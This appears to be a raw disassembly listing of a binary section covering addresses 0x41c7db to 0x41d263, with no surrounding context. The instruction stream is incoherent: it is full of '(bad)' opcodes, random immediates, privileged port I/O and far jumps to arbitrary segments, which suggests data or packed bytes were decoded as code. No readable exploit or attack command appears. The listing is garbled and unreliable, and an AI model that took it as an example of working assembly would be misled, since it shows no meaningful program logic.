  41c7db:	fcmove st,st(6)
  41c7dd:	repnz push ebx
  41c7df:	out    dx,al
  41c7e0:	pusha  
  41c7e1:	icebp  
  41c7e2:	in     al,dx
  41c7e3:	mov    edx,0x10e44bd2
  41c7e8:	js     0x41c81b
  41c7ea:	shl    ebp,cl
  41c7ec:	xchg   ebx,eax
  41c7ed:	scas   al,BYTE PTR es:[edi]
  41c7ee:	int3   
  41c7ef:	pusha  
  41c7f0:	mov    eax,0xdaeec4a4
  41c7f5:	lahf   
  41c7f6:	add    al,0xfa
  41c7f8:	fisub  DWORD PTR [eax]
  41c7fa:	adc    eax,0xf9c9b347
  41c7ff:	mov    ch,0xa7
  41c801:	xor    eax,0xc4d154c5
  41c806:	jno    0x41c810
  41c808:	adc    BYTE PTR [ecx],dh
  41c80a:	retf   
  41c80b:	cmp    bh,BYTE PTR [edx-0x53f47244]
  41c811:	mov    bh,0x75
  41c813:	not    ecx
  41c815:	xchg   BYTE PTR ds:0x1c8f5643,al
  41c81b:	(bad)  
  41c81c:	mov    ?,WORD PTR [edi-0x2a]
  41c81f:	(bad)  
  41c820:	xchg   ebx,eax
  41c821:	pusha  
  41c822:	addr16 mov ebp,0x25e32822
  41c828:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c829:	fstp   st(6)
  41c82b:	ins    DWORD PTR es:[edi],dx
  41c82c:	mov    cl,0xe7
  41c82e:	enter  0x3f5e,0x3d
  41c832:	inc    ebx
  41c833:	push   esp
  41c834:	icebp  
  41c835:	mov    bh,0xfc
  41c837:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c838:	out    dx,al
  41c839:	xlat   BYTE PTR ds:[ebx]
  41c83a:	leave  
  41c83b:	fist   WORD PTR [ebp+0x5ecacfad]
  41c841:	shr    esi,1
  41c843:	lea    ecx,[ebx-0x79ddbda4]
  41c849:	repz inc esi
  41c84b:	fist   WORD PTR [esi+0x182a2ed2]
  41c851:	mov    ds:0x522193e6,eax
  41c856:	mov    DWORD PTR [edi+0x5e6fe684],0xacb82c8a
  41c860:	mov    eax,0x9af41e5a
  41c865:	cmp    esi,DWORD PTR [edx-0x1fb16147]
  41c86b:	mov    esp,0x833a7cd5
  41c870:	cmp    BYTE PTR [ecx+0x61],cl
  41c873:	xor    esp,edx
  41c875:	(bad)
  41c878:	jmp    0x6bb1b71e
  41c87d:	adc    edx,ebx
  41c87f:	cmp    eax,0xe14c232a
  41c884:	mov    ebx,0xa12d5e0c
  41c889:	dec    edx
  41c88a:	shl    ah,0xe7
  41c88d:	push   eax
  41c88e:	(bad)  
  41c890:	rcl    BYTE PTR [ecx],cl
  41c892:	add    al,0x58
  41c894:	inc    eax
  41c895:	lock and BYTE PTR [ecx-0x387e6da1],ch
  41c89c:	jl     0x41c850
  41c89e:	cmp    edx,ecx
  41c8a0:	add    bl,BYTE PTR [eax]
  41c8a2:	retf   0x98f0
  41c8a5:	fadd   DWORD PTR [ebp+0x5070f7ca]
  41c8ab:	ficom  DWORD PTR [eax]
  41c8ad:	and    dl,BYTE PTR [ecx-0x5c]
  41c8b0:	fincstp 
  41c8b2:	jo     0x41c91e
  41c8b4:	(bad)  
  41c8b5:	adc    eax,0xe391ee2f
  41c8ba:	xchg   edx,eax
  41c8bb:	test   DWORD PTR [edx+0x67748851],esi
  41c8c1:	ret    
	...
  41c932:	add    BYTE PTR [eax],al
  41c934:	ret    
  41c935:	mov    esp,0xf87f4844
  41c93a:	iret   
  41c93b:	mov    edi,0x4f0c9749
  41c940:	cmc    
  41c941:	(bad)  
  41c942:	mov    ch,0x13
  41c944:	pop    eax
  41c945:	xor    al,0x1
  41c947:	add    dh,dh
  41c949:	add    BYTE PTR [eax],al
  41c94b:	add    BYTE PTR [ebx+0x7f],bl
  41c94e:	mov    ebp,0xd04d1bde
  41c953:	push   edx
  41c954:	ret    0x7f5e
  41c957:	sub    DWORD PTR [edi-0x11caab2b],0xffffffa6
  41c95e:	sub    BYTE PTR [ecx-0x1c306c6e],bl
  41c964:	sbb    edi,esp
  41c966:	jae    0x41c973
  41c968:	idiv   DWORD PTR [edx+0x16]
  41c96b:	mov    dl,0xf
  41c96d:	pop    esi
  41c96e:	push   edi
  41c96f:	pop    edi
  41c970:	lahf   
  41c971:	sbb    DWORD PTR [esi-0x3e],ecx
  41c974:	xchg   ecx,eax
  41c975:	xor    dh,BYTE PTR [esi]
  41c977:	pushf  
  41c978:	enter  0x64b1,0x38
  41c97c:	retf   
  41c97d:	icebp  
  41c97e:	xchg   ecx,eax
  41c97f:	ss into 
  41c981:	imul   esp,DWORD PTR [eax-0x3],0x19
  41c985:	ss enter 0x261c,0x73
  41c98a:	shl    DWORD PTR [ebp-0x7c892e56],0x7e
  41c991:	push   esi
  41c992:	sub    DWORD PTR [esi+0xc],edx
  41c995:	jne    0x41c992
  41c997:	mov    WORD PTR [edi],ss
  41c999:	xor    BYTE PTR [edi-0x540f96f7],0xef
  41c9a0:	fcmovne st,st(0)
  41c9a2:	rcl    DWORD PTR [esi+0x492f7284],0xb6
  41c9a9:	mov    BYTE PTR [eax-0x69],0x26
  41c9ad:	ins    BYTE PTR es:[edi],dx
  41c9ae:	mov    cl,0xba
  41c9b0:	shl    ah,1
  41c9b2:	push   edi
  41c9b3:	xor    ebx,DWORD PTR [ebp-0x4f251ae]
  41c9b9:	cmovne ebx,DWORD PTR [edi-0xebba9e2]
  41c9c0:	sbb    eax,0x89c260f7
  41c9c5:	xor    al,0x75
  41c9c7:	add    DWORD PTR [edx+0x14b2853b],0x4e
  41c9ce:	in     eax,dx
  41c9cf:	xor    al,0xf7
  41c9d1:	mov    ah,0x9f
  41c9d3:	mov    esp,0xa74b5b47
  41c9d8:	nop
  41c9d9:	jecxz  0x41c9fc
  41c9db:	sub    al,0x74
  41c9dd:	mov    ah,0xb8
  41c9df:	xchg   DWORD PTR [edi+0x386037d0],esi
  41c9e5:	pusha  
  41c9e6:	adc    al,BYTE PTR gs:[eax+esi*1+0x71f07f8a]
  41c9ee:	or     BYTE PTR [edi],ah
  41c9f0:	popa   
  41c9f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c9f2:	mul    DWORD PTR [esi+0xe9c2e4c]
  41c9f8:	stos   DWORD PTR es:[edi],eax
  41c9f9:	std    
  41c9fa:	dec    edi
  41c9fb:	mov    dh,0x31
  41c9fd:	pop    ebx
  41c9fe:	loop   0x41ca06
  41ca00:	and    BYTE PTR ss:[eax+0x3e],dl
  41ca04:	push   DWORD PTR [ebx-0x362e7c0e]
  41ca0a:	mov    esp,0x63ad1baa
  41ca0f:	jno    0x41ca7b
  41ca11:	cmp    ebp,ecx
  41ca13:	xchg   edi,eax
  41ca14:	daa    
  41ca15:	or     DWORD PTR [edx-0x12],0x447c7bac
  41ca1c:	in     eax,dx
  41ca1d:	dec    ebx
  41ca1e:	sbb    dl,dl
  41ca20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca21:	inc    ebx
  41ca22:	sub    BYTE PTR ds:0x61b8d97a,dl
  41ca28:	xchg   DWORD PTR [edx],edi
  41ca2a:	add    BYTE PTR [esi-0x2c],al
  41ca2d:	test   esi,edi
  41ca2f:	mov    esi,DWORD PTR [esi]
  41ca31:	mul    BYTE PTR [edx-0x42564dbd]
  41ca37:	scas   eax,DWORD PTR es:[edi]
  41ca38:	add    BYTE PTR [edi],dl
  41ca3a:	ins    DWORD PTR es:[edi],dx
  41ca3b:	je     0x41ca7a
  41ca3d:	(bad)  
  41ca3e:	call   0xcda6df
	...
  41cab3:	add    BYTE PTR [edx],cl
  41cab5:	mov    eax,0xbfb7aaa5
  41caba:	(bad)  
  41cabc:	sbb    eax,0x8de2887e
  41cac1:	xchg   edi,eax
  41cac2:	cmp    dl,ah
  41cac4:	dec    esi
  41cac5:	xor    eax,0xf60001
  41caca:	add    BYTE PTR [eax],al
  41cacc:	inc    edx
  41cacd:	in     al,dx
  41cace:	adc    al,0x63
  41cad0:	daa    
  41cad1:	test   BYTE PTR [ecx],cl
  41cad3:	sbb    DWORD PTR [eax+eiz*4+0x442759b7],0xe
  41cadb:	cwde   
  41cadc:	mov    al,0xfc
  41cade:	pop    ebp
  41cadf:	xchg   DWORD PTR [edx+0x57ce2412],ebx
  41cae5:	dec    eax
  41cae6:	sahf   
  41cae7:	enter  0x8490,0xf2
  41caeb:	sub    DWORD PTR [eax-0x3a],ecx
  41caee:	mov    eax,0xc72650c4
  41caf3:	ficomp DWORD PTR [ebp+0x53c821ba]
  41caf9:	and    eax,DWORD PTR [edi+0x45e9a561]
  41caff:	push   cs
  41cb00:	cwde   
  41cb01:	add    bl,BYTE PTR [edx]
  41cb03:	jl     0x41cb3c
  41cb05:	dec    esp
  41cb06:	rcr    DWORD PTR [ecx-0x723456a8],0xb3
  41cb0d:	or     BYTE PTR [ecx+0x45370be5],al
  41cb13:	mov    eax,0x716a1367
  41cb18:	mov    dh,0xb8
  41cb1a:	rcl    ch,1
  41cb1c:	fld    QWORD PTR [edi]
  41cb1e:	mov    ds:0x1928a3c1,eax
  41cb23:	(bad)  
  41cb24:	xor    eax,0xfb693ed3
  41cb29:	mov    cl,0x7c
  41cb2b:	adc    eax,0xa25b5a7
  41cb30:	and    ah,ah
  41cb32:	sub    BYTE PTR [edx+esi*1-0x70ac4f72],ah
  41cb39:	jnp    0x41cbb7
  41cb3b:	dec    ecx
  41cb3c:	ins    BYTE PTR es:[edi],dx
  41cb3d:	sysenter 
  41cb3f:	xlat   BYTE PTR ds:[ebx]
  41cb40:	(bad)  
  41cb41:	jns    0x41cb08
  41cb43:	(bad)  
  41cb44:	jo     0x41cb0d
  41cb46:	psrlw  mm3,0x39
  41cb4a:	and    bl,cl
  41cb4c:	fnstcw WORD PTR [esi-0x24]
  41cb4f:	mov    edx,0xa0049251
  41cb54:	ja     0x41cb23
  41cb56:	(bad)  
  41cb57:	pusha  
  41cb58:	(bad)  
  41cb59:	call   0xd792f4b4
  41cb5e:	ret    
  41cb5f:	scas   eax,DWORD PTR es:[edi]
  41cb60:	aaa    
  41cb61:	inc    ecx
  41cb62:	ss push ebp
  41cb64:	sub    esp,DWORD PTR [ecx+0x9]
  41cb67:	stc    
  41cb68:	std    
  41cb69:	mov    es,WORD PTR [esi+0x35a1c282]
  41cb6f:	xlat   BYTE PTR ds:[ebx]
  41cb70:	xor    al,0xc5
  41cb72:	inc    ebp
  41cb73:	imul   ebx,ebx,0x6e690d94
  41cb79:	cmp    eax,0x5d8395d9
  41cb7e:	shl    DWORD PTR [ecx+ebx*2-0x43d9ca],1
  41cb85:	popf   
  41cb86:	inc    ecx
  41cb87:	fcomip st,st(7)
  41cb89:	adc    eax,0xab6a56dd
  41cb8e:	leave  
  41cb8f:	mov    edi,0xd8608169
  41cb94:	jb     0x41cb6d
  41cb96:	call   0x90e6:0x9a40092
  41cb9d:	mov    edi,0xd9db43fc
  41cba2:	mov    al,0xcc
  41cba4:	pop    eax
  41cba5:	pushf  
  41cba6:	loop   0x41cbaf
  41cba8:	push   esp
  41cba9:	jno    0x41cba9
  41cbab:	jo     0x41cbcc
  41cbad:	sbb    ebx,0xf56197c8
  41cbb3:	push   esi
  41cbb4:	mov    esp,0x678ebaac
  41cbb9:	ins    DWORD PTR es:[edi],dx
  41cbba:	pop    ss
  41cbbb:	int3   
  41cbbc:	push   ss
  41cbbd:	mov    ebx,DWORD PTR [esi+0xb015e7]
	...
  41cc33:	add    dl,dl
  41cc35:	xor    bh,dl
  41cc37:	clc    
  41cc38:	cli    
  41cc39:	clc    
  41cc3a:	sar    BYTE PTR [edx],cl
  41cc3c:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc3e:	inc    eax
  41cc3f:	aam    0xb3
  41cc41:	xor    ebp,DWORD PTR [esi]
  41cc43:	stos   DWORD PTR es:[edi],eax
  41cc44:	inc    esp
  41cc45:	add    DWORD PTR ss:[eax],eax
  41cc48:	test   BYTE PTR [eax],0x0
  41cc4b:	add    ch,bl
  41cc4d:	jecxz  0x41cc75
  41cc4f:	cld    
  41cc50:	add    BYTE PTR [ebp+0x32],ch
  41cc53:	cld    
  41cc54:	aas    
  41cc55:	clc    
  41cc56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc57:	adc    eax,DWORD PTR [eax-0x12144bdb]
  41cc5d:	dec    edx
  41cc5e:	add    eax,0x58e4081c
  41cc63:	div    BYTE PTR [ecx+0x591344de]
  41cc69:	push   esi
  41cc6a:	sub    DWORD PTR [ebx+edi*8],esi
  41cc6d:	inc    ebx
  41cc6e:	mov    ah,0x58
  41cc70:	or     eax,0x4cc98e83
  41cc75:	pop    ss
  41cc76:	fcomp  st(3)
  41cc78:	sbb    eax,DWORD PTR [ebp+0x33]
  41cc7b:	into   
  41cc7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc7d:	stos   DWORD PTR es:[edi],eax
  41cc7e:	into   
  41cc7f:	jmp    0x54ec:0xebee8a4e
  41cc86:	(bad)  
  41cc88:	daa    
  41cc89:	retf   0x93f5
  41cc8c:	lods   eax,DWORD PTR ds:[esi]
  41cc8d:	mov    esi,0x248aa7a6
  41cc92:	lds    esp,FWORD PTR [esi+0x7e]
  41cc95:	push   eax
  41cc96:	inc    esi
  41cc97:	sbb    al,0x5c
  41cc99:	mov    al,0x76
  41cc9b:	mov    al,0x30
  41cc9d:	push   esp
  41cc9e:	adc    ch,BYTE PTR [eax+0x10]
  41cca1:	(bad)  
  41cca2:	mov    bh,0xa0
  41cca4:	fs add eax,0x6c75a5c3
  41ccaa:	mov    es,WORD PTR [ebx+edi*4+0x6d]
  41ccae:	push   edi
  41ccaf:	das    
  41ccb0:	cdq    
  41ccb1:	pop    esi
  41ccb2:	stos   DWORD PTR es:[edi],eax
  41ccb3:	jl     0x41ccd3
  41ccb5:	lods   eax,DWORD PTR ds:[esi]
  41ccb6:	mov    ds:0xc4ae1233,al
  41ccbb:	popa   
  41ccbc:	inc    edx
  41ccbd:	mov    ch,0xc4
  41ccbf:	in     al,0x18
  41ccc1:	xchg   ebx,esi
  41ccc3:	push   DWORD PTR [esi+0x69]
  41ccc6:	xchg   edi,eax
  41ccc7:	xchg   edx,eax
  41ccc8:	inc    ecx
  41ccc9:	lock mov ebx,0xe0509f8a
  41cccf:	cdq    
  41ccd0:	xlat   BYTE PTR ds:[ebx]
  41ccd1:	cmc    
  41ccd2:	push   0x4a88be90
  41ccd7:	mov    edx,0x4369ed11
  41ccdc:	inc    eax
  41ccdd:	faddp  st(7),st
  41ccdf:	pop    edi
  41cce0:	xchg   bh,bh
  41cce2:	fimul  DWORD PTR [ebp+ebp*2-0x9]
  41cce6:	(bad)  
  41cce7:	mov    esp,DWORD PTR [eax+0xe1569b0]
  41cced:	fwait
  41ccee:	hlt    
  41ccef:	ins    BYTE PTR es:[edi],dx
  41ccf0:	push   0xc5f1df0
  41ccf5:	ror    BYTE PTR [edi+edx*1+0x7eb46381],1
  41ccfc:	stc    
  41ccfd:	cmp    DWORD PTR [edx-0x46b9900d],eax
  41cd03:	fld    TBYTE PTR [ebx+ecx*4+0x5a24cdd]
  41cd0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd0b:	aas    
  41cd0c:	or     BYTE PTR [ebx+0x60],al
  41cd0f:	in     eax,dx
  41cd10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd11:	lea    ebp,[edi+0x31f1f622]
  41cd17:	cmp    ecx,esi
  41cd19:	call   0x67ad:0x17bbae66
  41cd20:	jle    0x41ccfe
  41cd22:	jmp    0x41ccee
  41cd24:	mov    edi,0xe4dcf6eb
  41cd29:	in     eax,0x68
  41cd2b:	(bad)  
  41cd2c:	jle    0x41cd09
  41cd2e:	sub    al,0xf1
  41cd30:	add    al,0x14
  41cd32:	fisub  WORD PTR [eax-0x47b13733]
  41cd38:	dec    eax
  41cd39:	icebp  
  41cd3a:	sbb    eax,0x28b57efb
  41cd3f:	popa   
  41cd40:	outs   dx,DWORD PTR ds:[esi]
  41cd41:	popa   
	...
  41cdb2:	add    BYTE PTR [eax],al
  41cdb4:	test   DWORD PTR [ebp+0x7b9c6a9c],ecx
  41cdba:	imul   edi
  41cdbc:	push   ebp
  41cdbd:	call   0x89f9:0xae7cb1bb
  41cdc4:	cmp    dh,BYTE PTR [edi]
  41cdc6:	add    DWORD PTR [eax],eax
  41cdc8:	test   BYTE PTR [eax],0x0
  41cdcb:	add    BYTE PTR [ecx],ch
  41cdcd:	xchg   ecx,eax
  41cdce:	call   0x200f5696
  41cdd3:	leave  
  41cdd4:	fs ds jecxz 0x41ce26
  41cdd8:	and    BYTE PTR [ebx+esi*4],bl
  41cddb:	icebp  
  41cddc:	icebp  
  41cddd:	or     ah,BYTE PTR [esi+0x61fce2d6]
  41cde3:	pop    ecx
  41cde4:	and    esi,edx
  41cde6:	push   esp
  41cde7:	xchg   DWORD PTR [eax],eax
  41cde9:	dec    ebx
  41cdea:	push   esp
  41cdeb:	fimul  WORD PTR cs:[ecx+0x7d]
  41cdef:	outs   dx,BYTE PTR ds:[esi]
  41cdf0:	dec    esp
  41cdf1:	jecxz  0x41cdda
  41cdf3:	(bad)  
  41cdf4:	pushf  
  41cdf5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cdf6:	and    ch,BYTE PTR [ebx]
  41cdf8:	lahf   
  41cdf9:	lods   al,BYTE PTR ds:[esi]
  41cdfa:	sub    al,0x7
  41cdfc:	sahf   
  41cdfd:	adc    al,0x94
  41cdff:	lods   eax,DWORD PTR es:[esi]
  41ce01:	cli    
  41ce02:	mov    dh,0xdb
  41ce04:	add    DWORD PTR [edx+ebp*8+0x2ebeb651],ecx
  41ce0b:	sbb    DWORD PTR ds:0xb0791558,0xebd4b9be
  41ce15:	push   eax
  41ce16:	pop    ss
  41ce17:	inc    eax
  41ce18:	rcr    BYTE PTR [esi+0x667673d1],cl
  41ce1e:	cmp    eax,0x5fcc0add
  41ce23:	cmp    eax,0xb8be3b96
  41ce28:	jnp    0x41ce58
  41ce2a:	cmp    eax,0x76d20838
  41ce2f:	xor    eax,esi
  41ce31:	xchg   ecx,eax
  41ce32:	mov    bl,BYTE PTR [ebx+0x4c11aa19]
  41ce38:	mov    bh,BYTE PTR [ecx]
  41ce3a:	(bad)  
  41ce3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce3d:	outs   dx,DWORD PTR ds:[esi]
  41ce3e:	(bad)  
  41ce3f:	and    eax,DWORD PTR [edx+0x56eb9f16]
  41ce45:	ffreep st(6)
  41ce47:	mul    DWORD PTR [edi+0x3f]
  41ce4a:	jo     0x41ce77
  41ce4c:	inc    ebx
  41ce4d:	dec    edi
  41ce4e:	popa   
  41ce4f:	dec    ebx
  41ce50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce51:	sti    
  41ce52:	stos   DWORD PTR es:[edi],eax
  41ce53:	call   0x8fe2:0x985cbea
  41ce5a:	and    al,0xa
  41ce5c:	xor    ebx,DWORD PTR [ebp-0x121be359]
  41ce62:	outs   dx,DWORD PTR ds:[esi]
  41ce63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce64:	push   edx
  41ce65:	ds jb  0x41ce89
  41ce68:	mov    ecx,0x40e6a58d
  41ce6d:	icebp  
  41ce6e:	rcl    DWORD PTR ds:[eax+0x33dc102c],1
  41ce75:	mov    eax,0x445f13dd
  41ce7a:	out    0xbc,al
  41ce7c:	stos   DWORD PTR es:[edi],eax
  41ce7d:	cbw    
  41ce7f:	js     0x41cef9
  41ce81:	dec    esi
  41ce82:	shr    BYTE PTR fs:[edx+0x4d],cl
  41ce86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce87:	cmp    BYTE PTR [ebx+0x5c],bl
  41ce8a:	adc    ebx,DWORD PTR [eax]
  41ce8c:	mov    edx,0xf3c43db0
  41ce91:	scas   eax,DWORD PTR es:[edi]
  41ce92:	iret   
  41ce93:	fnsave [edx+esi*1]
  41ce96:	(bad)  
  41ce97:	and    eax,DWORD PTR [eax-0x27]
  41ce9a:	dec    ebx
  41ce9b:	xor    al,bh
  41ce9d:	dec    edi
  41ce9e:	int3   
  41ce9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cea0:	vmread ecx,esp
  41cea3:	xchg   ebx,eax
  41cea4:	mov    BYTE PTR [edx-0x64d88fcb],0x6e
  41ceab:	lods   eax,DWORD PTR ds:[esi]
  41ceac:	xchg   BYTE PTR [edx+edx*2],al
  41ceaf:	sub    esp,edx
  41ceb1:	or     ebx,DWORD PTR [edx]
  41ceb3:	cmp    BYTE PTR [edi+eax*1],al
  41ceb6:	repnz popf 
  41ceb8:	mov    eax,0x82b75e2
  41cebd:	daa    
  41cebe:	bound  eax,QWORD PTR [ecx]
  41cec0:	jnp    0x41ce56
	...
  41cf32:	add    BYTE PTR [eax],al
  41cf34:	fs jae 0x41cf6a
  41cf37:	es aaa 
  41cf39:	data16 jne 0x41cfaf
  41cf3c:	cmc    
  41cf3d:	jle    0x41cf41
  41cf3f:	dec    esi
  41cf40:	ds push 0xffffffcb
  41cf43:	xor    BYTE PTR [bx+si],bh
  41cf46:	add    DWORD PTR [eax],eax
  41cf48:	test   BYTE PTR [eax],0x0
  41cf4b:	add    bh,ah
  41cf4d:	repz add edx,DWORD PTR [ebp+0x9]
  41cf51:	fisubr WORD PTR [eax+0x683b2498]
  41cf57:	(bad)  
  41cf58:	gs retf 
  41cf5a:	fldl2e 
  41cf5c:	in     al,0xb5
  41cf5e:	cs sahf 
  41cf60:	lods   eax,DWORD PTR ds:[esi]
  41cf61:	mov    ebp,0xfcd55ac
  41cf66:	imul   ebx,DWORD PTR [ebx+0x20],0x3b0dff9c
  41cf6d:	adc    eax,0xd87c283f
  41cf72:	shl    BYTE PTR [ecx],cl
  41cf74:	lea    ecx,[edx]
  41cf76:	imul   BYTE PTR [eax+0x5cc23e10]
  41cf7c:	jg     0x41cfc1
  41cf7e:	call   0x5c17dc5d
  41cf83:	dec    eax
  41cf84:	sub    al,0xce
  41cf86:	sar    DWORD PTR [eax-0x2848bc18],1
  41cf8c:	(bad)  
  41cf8d:	imul   ebx,ebp,0xffffffe6
  41cf90:	bound  ecx,QWORD PTR [ebx-0x2174c8a2]
  41cf96:	cmp    ebx,DWORD PTR [eax]
  41cf98:	adc    edi,ecx
  41cf9a:	ja     0x41cf32
  41cf9c:	adc    DWORD PTR [edx+0x54a83cbe],ebp
  41cfa2:	outs   dx,DWORD PTR ds:[esi]
  41cfa3:	xchg   edi,eax
  41cfa4:	test   al,0x9
  41cfa6:	rol    DWORD PTR [edi-0x56],cl
  41cfa9:	mov    bl,0xc8
  41cfab:	jp     0x41cfd9
  41cfad:	jb     0x41d02e
  41cfaf:	sbb    eax,0x372539dd
  41cfb4:	loop   0x41cfaf
  41cfb6:	out    0x2a,eax
  41cfb8:	mov    ds:0xc07fc6c9,al
  41cfbd:	out    dx,eax
  41cfbe:	imul   edi,esi,0x6
  41cfc1:	dec    edi
  41cfc2:	rcr    DWORD PTR [ebp-0x57],1
  41cfc5:	jle    0x41cf90
  41cfc7:	or     eax,0xc95f2e15
  41cfcc:	cli    
  41cfcd:	push   edi
  41cfce:	xor    eax,0x3f6173bc
  41cfd3:	leave  
  41cfd4:	mov    eax,0xbaea0e6b
  41cfd9:	mov    ebp,0x2a01f257
  41cfde:	fst    QWORD PTR [edx]
  41cfe0:	test   DWORD PTR [ecx-0x77fc62e9],ebp
  41cfe6:	xor    ebx,DWORD PTR ds:0x712b06c9
  41cfec:	inc    ebx
  41cfed:	cdq    
  41cfee:	mov    cl,0x67
  41cff0:	out    dx,eax
  41cff1:	sub    ecx,DWORD PTR ds:0xd86b2c70
  41cff7:	xchg   DWORD PTR [eax+ecx*1-0xbdee55d],ebp
  41cffe:	dec    eax
  41cfff:	neg    DWORD PTR [ecx+0x2cff3d5e]
  41d005:	jmp    0x83:0xe9bedf10
  41d00c:	sub    edx,0x66
  41d00f:	and    DWORD PTR [eax+esi*8+0x3d],ecx
  41d013:	xor    cl,BYTE PTR [esi]
  41d015:	in     al,dx
  41d016:	and    ch,cl
  41d018:	adc    al,0x78
  41d01a:	rcl    BYTE PTR [ecx+0x434359c8],0xfc
  41d021:	mov    dl,0x12
  41d023:	fcom   st(2)
  41d025:	jo     0x41cfe8
  41d027:	pop    edx
  41d028:	rcr    DWORD PTR [esi+ebx*2],cl
  41d02b:	sub    cl,BYTE PTR [ecx+0x410ff0e3]
  41d031:	rcl    DWORD PTR [edx-0x80],0x21
  41d035:	xchg   edx,eax
  41d036:	adc    eax,0xa19e772c
  41d03b:	and    BYTE PTR [edi-0x7a],bh
  41d03e:	mov    ebx,0xd25228
	...
  41d0b3:	add    cl,bl
  41d0b5:	dec    edx
  41d0b6:	mov    eax,ds:0xd9fbb3f8
  41d0bb:	imul   ebp,DWORD PTR [edx-0x297f5868],0xffffff93
  41d0c2:	lahf   
  41d0c3:	call   0xf6:0x13926
  41d0ca:	add    BYTE PTR [eax],al
  41d0cc:	sub    DWORD PTR gs:[eax-0x69f5f8c8],0x35
  41d0d4:	stos   DWORD PTR es:[edi],eax
  41d0d5:	push   esp
  41d0d6:	shr    DWORD PTR ds:0x602f2b90,0xf6
  41d0dd:	push   ss
  41d0de:	adc    DWORD PTR [esi],esi
  41d0e0:	fs pusha 
  41d0e2:	out    0xf7,eax
  41d0e4:	cli    
  41d0e5:	inc    ebp
  41d0e6:	pop    ebp
  41d0e7:	cmp    BYTE PTR [esp+esi*8+0x799029e9],cl
  41d0ee:	mul    BYTE PTR [edx]
  41d0f0:	dec    eax
  41d0f1:	dec    ecx
  41d0f2:	nop
  41d0f3:	mov    ds:0xd6c0ca5,eax
  41d0f8:	stos   BYTE PTR es:[edi],al
  41d0f9:	or     DWORD PTR [ecx],esi
  41d0fb:	imul   eax,DWORD PTR [edx],0x6c
  41d0fe:	lods   al,BYTE PTR ds:[esi]
  41d0ff:	out    0xb1,eax
  41d101:	inc    edi
  41d102:	cmp    al,0xc6
  41d104:	sbb    al,0x5b
  41d106:	add    DWORD PTR [esi-0x60955a50],ebp
  41d10c:	imul   ebx,DWORD PTR [esp+ebx*1+0x1f505fcc],0xb
  41d114:	mov    esi,0x57176aff
  41d119:	or     bh,BYTE PTR [esi-0xf]
  41d11c:	jecxz  0x41d0fe
  41d11e:	mov    ebx,0x955a3408
  41d123:	pop    ss
  41d124:	mov    fs,WORD PTR [ebx-0x5fa938de]
  41d12a:	mov    eax,0x3de57e0e
  41d12f:	sar    BYTE PTR [ebx+0x1aa8efb5],1
  41d135:	and    eax,0x3efe1188
  41d13a:	sahf   
  41d13b:	jbe    0x41d142
  41d13d:	nop
  41d13e:	push   es
  41d13f:	mov    ebp,0xc35492b0
  41d144:	(bad)  
  41d145:	jnp    0x41d16a
  41d147:	xor    BYTE PTR [edi],dl
  41d149:	sar    WORD PTR [ebx],1
  41d14c:	outs   dx,DWORD PTR ds:[esi]
  41d14d:	jno    0x41d19c
  41d14f:	aad    0x24
  41d151:	sbb    BYTE PTR [ecx-0x34d4d5d9],0xf
  41d158:	or     eax,0x5450edfc
  41d15d:	sahf   
  41d15e:	mul    DWORD PTR [ebp-0x52]
  41d161:	cld    
  41d162:	in     al,0xa7
  41d164:	xor    eax,0xefde1c19
  41d169:	jg     0x41d1b3
  41d16b:	leave  
  41d16c:	sbb    BYTE PTR [ecx],dl
  41d16e:	test   BYTE PTR [ecx-0x5e],bh
  41d171:	fnstenv [edi+0x74]
  41d174:	sbb    edx,esp
  41d176:	mov    ah,0x9a
  41d178:	pop    ds
  41d179:	add    ch,BYTE PTR [edx+0x1d]
  41d17c:	lods   eax,DWORD PTR ds:[esi]
  41d17d:	call   0x3744:0xcdeb878
  41d184:	push   ebx
  41d185:	pushf  
  41d186:	add    BYTE PTR [edi+0x45ce1748],ch
  41d18c:	in     al,dx
  41d18d:	mov    bl,0x41
  41d18f:	add    ch,BYTE PTR [edx-0x5ce65125]
  41d195:	lods   eax,DWORD PTR ds:[esi]
  41d196:	xchg   eax,edx
  41d198:	and    BYTE PTR [edx-0x48],0x15
  41d19c:	lea    ebx,[ebp+0x261994c2]
  41d1a2:	pop    ebp
  41d1a3:	mov    dl,0xf4
  41d1a5:	jl     0x41d20c
  41d1a7:	ins    DWORD PTR es:[edi],dx
  41d1a8:	xor    al,0x1f
  41d1aa:	jbe    0x41d217
  41d1ac:	cwde   
  41d1ad:	jle    0x41d168
  41d1af:	addr16 adc al,0xa0
  41d1b2:	aaa    
  41d1b3:	sbb    al,0x3c
  41d1b5:	fbstp  TBYTE PTR [edi+eiz*4+0x78]
  41d1b9:	shl    DWORD PTR [edx+0x4abdc19a],0x32
  41d1c0:	shl    DWORD PTR [ebx+0x0],0x0
	...
  41d234:	repz and ebp,ecx
  41d237:	push   ebp
  41d238:	(bad)  
  41d23a:	sti    
  41d23b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d23c:	pop    edi
  41d23d:	push   edx
  41d23e:	jo     0x41d1ff
  41d240:	xchg   ebx,eax
  41d241:	lods   al,BYTE PTR ds:[esi]
  41d242:	test   eax,0x13a1c2d
  41d247:	add    dh,dh
  41d249:	add    BYTE PTR [eax],al
  41d24b:	add    BYTE PTR [eax+0x373d4595],bh
  41d251:	int    0x28
  41d253:	dec    edi
  41d254:	sub    BYTE PTR [ebx+0x3d],ch
  41d257:	fisubr DWORD PTR ds:0xc4a4d315
  41d25d:	and    DWORD PTR [ebx],esi
  41d25f:	or     edi,esi
  41d261:	mov    ah,0x87
  41d263:	cmp    ch,BYTE PTR [edx]
